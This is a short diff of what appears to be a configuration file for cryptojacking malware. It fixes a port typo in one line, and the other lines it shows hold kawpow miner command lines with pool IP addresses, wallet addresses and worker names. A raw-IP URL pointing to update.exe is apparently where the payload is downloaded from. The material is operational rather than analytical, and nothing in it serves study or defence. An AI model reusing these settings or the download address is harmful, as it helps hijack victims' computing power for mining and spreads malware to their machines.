@@ -374,9 +374,10 @@
 AQD--15.235.212.90:16060 -a kawpow  -p x --no-strict-ssl --no-watchdog -u RJMcttA4R9H9kqvQPZMNNV7Hh5VtdMh7Aw.BB--AQD
 AQC--15.235.212.90:16060 -a kawpow  -p x --no-strict-ssl --no-watchdog -u RJMcttA4R9H9kqvQPZMNNV7Hh5VtdMh7Aw.AA--AQC
 AAA--49.234.134.145--AAA
-AQA--64.120.114.165::1140 -u RYHnfqPsrBgmA5iCDSXBKexsJb15prq1XD -w my_rig -a kawpow --no-watchdog--AQA
+AQA--64.120.114.165:1140 -u RYHnfqPsrBgmA5iCDSXBKexsJb15prq1XD -w my_rig -a kawpow --no-watchdog--AQA
 CA-2-CA
 DA-http://49.234.134.145:62121/update.exe-DA
 
 --------------------------------------------------------------------------------------------------------------------------------------
+
 
